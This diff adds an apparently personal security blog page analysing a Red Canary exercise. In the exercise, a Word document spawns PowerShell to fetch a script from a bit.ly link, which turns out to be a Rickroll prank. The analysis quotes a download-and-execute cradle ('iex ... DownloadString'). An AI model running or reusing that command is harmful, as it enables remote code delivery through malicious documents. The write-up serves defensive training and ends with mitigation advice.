@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Scenario #1 Analysis · Will Seligman</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="/index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="other/exercises/red-canary/scenario-1-analysis.html"></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="/other/index.html">Other</a> &rsaquo; <a href="/other/exercises.html">Exercises</a> &rsaquo; <a href="/other/exercises/red-canary.html">Red Canary</a></div>
+  <h1 id="scenario-1-analysis">Scenario #1 Analysis</h1>
+<p>First we want to check where the final URL unravels to from the URL shortener bit.ly. VirusTotal easily shows this for us:</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>Based off the extension this is likely a PowerShell script, and after analyzing the URL, we can confirm from the final URL: <a href="https://urlscan.io/responses/ca50cc0456846fc7412ef6dbe94c54e5130db5ea988f7b6f27576d22724b24a8/">urlscan.io</a></p>
+<p>We can see some prevalence by who else is analyzing this URL from public scans:</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>Once we have the script we can start analyzing this part of the attack, and I think we’re about to get rick rolled:</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>This is a quick script to decode the encoded data variable the from the script</p>
+<pre><code class="language-python">#Imports
+import base64
+import gzip
+from io import BytesIO
+
+# Base64-encoded and gzipped data
+data = 'The base64 chunk of data' 
+
+# Decode the base64 string
+binary_data = base64.b64decode(data)
+
+# Decompress the gzipped data
+with gzip.GzipFile(fileobj=BytesIO(binary_data)) as f:
+    decompressed_data = f.read()
+
+# Convert the decompressed data to a string
+decoded_string = decompressed_data.decode('utf-8')
+
+# Print the decoded string
+print(decoded_string)
+</code></pre>
+<p>This is the decoded output from the script:</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>We also used a cyberchef recipe for easier sharing, showing the same decoded data:</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>Here’s the music being loaded in the script:</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><strong>Overview</strong></p>
+<p>This activity clearly demonstrates a classic <strong>malicious macro scenario</strong>, where a Word document (<strong>winword.exe</strong>) likely through macros or VBA scripts, linked objects, or some other vulnerability, triggers a <strong>PowerShell command</strong> to download and execute content from an external source. In this case, the <strong>CLI command</strong> shows: ’powershell.exe iex (New-Object Net.WebClient).DownloadString(“http://bit.ly/e0Mw9w”)’</p>
+<p><strong>Findings</strong></p>
+<ul>
+<li><strong>Parent Process (winword.exe):</strong> The Word document likely contains a macro or embedded script, a linked object, or some other vulnerability, that runs when the document is opened.</li>
+<li><strong>PowerShell Execution:</strong> The command uses <strong>PowerShell’s Invoke-Expression (iex)</strong> function, which allows the execution of a string as a script.</li>
+<li><strong>Web Request:</strong> PowerShell's <strong>Net.WebClient.DownloadString</strong> is used to download a script from a shortened URL (bit.ly/e0Mw9w), which redirects to the infamous Rick Astley's “Never Gonna Give You Up” Rickroll ASCII art and song.</li>
+<li><strong>Network Connection:</strong> The <strong>network connection count of 1</strong> indicates that the machine makes a connection to retrieve the script over the web, in this case to stream the "Rickroll" content.</li>
+</ul>
+<p><strong>Summary</strong></p>
+<p>The PowerShell command downloaded content from a shortened URL, leading to the infamous "Rickroll" prank: ASCII dancing Rick Astley and the accompanying song. While this activity is inherently non malicious, it is a demonstration or proof of concept for other tactics used in real malicious scenarios to deliver malicious content. We would definitely recommend disabling macros by default, enabling detections for suspicious PowerShell commands, preventing execution of non-signed PowerShell scripts, and ensuring users are educated on the risks of opening unexpected documents and phishing type attacks.</p>
+  </article>
+  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+</main>
+</div>
+<script src="/assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
